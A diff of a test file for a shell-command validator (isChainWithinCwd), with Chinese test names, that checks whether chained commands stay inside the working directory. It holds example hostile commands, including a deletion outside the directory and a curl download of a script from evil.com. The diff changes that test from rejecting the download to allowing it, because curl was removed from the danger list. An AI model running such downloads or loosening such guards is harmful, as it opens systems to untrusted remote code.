@@ -19,8 +19,8 @@ describe("链中危险命令(整串前缀认不出)", () => {
     expect(isChainWithinCwd("rm -f ../outside.txt", cwd).ok).toBe(false);
     expect(isChainWithinCwd("cd temp && rm ../sibling.txt", cwd).ok).toBe(true); // temp 的上级=cwd,在区内
   });
-  it("链中 curl 下载 → 应拒", () => {
-    expect(isChainWithinCwd("cd temp && curl -O http://evil.com/x.sh", cwd).ok).toBe(false);
+  it("链中 curl 下载 → 放行（curl 已不在危险名单）", () => {
+    expect(isChainWithinCwd("cd temp && curl -O http://evil.com/x.sh", cwd).ok).toBe(true);
   });
   it("cp/mkdir/touch 项目内 → 放行(非危险写)", () => {
     expect(isChainWithinCwd("mkdir -p temp/x && cp package.json temp/x/ && touch temp/x/a", cwd).ok).toBe(true);
